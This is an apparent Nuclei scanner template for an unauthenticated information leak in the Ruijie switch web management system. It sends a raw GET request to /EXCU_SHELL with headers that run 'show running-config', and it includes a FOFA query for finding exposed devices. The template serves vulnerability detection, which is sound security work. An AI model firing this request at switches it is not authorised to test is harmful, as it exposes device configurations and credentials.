id: Ruijie-switch-EXCU_SHELL-info-leakage

info:
  name: Ruijie switch WEB management system EXCU_SHELL information leakage
  author: momika233
  severity: high
  reference:
    - https://https://github.com/momika233
  description: Ruijie switch WEB management system EXCU_SHELL information leakage
  metadata:
    max-request: 1
    verified: true
    fofa-query: body="img/free_login_ge.gif" && body="./img/login_bg.gif"

  tags: Ruijie-switch,info-leakage

requests:
  - raw:
      - |
        GET /EXCU_SHELL HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Cmdnum: '1'
        Command1: show running-config
        Confirm1: n

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "Building configuration.*"
        part: body

      - type: status
        status:
          - 200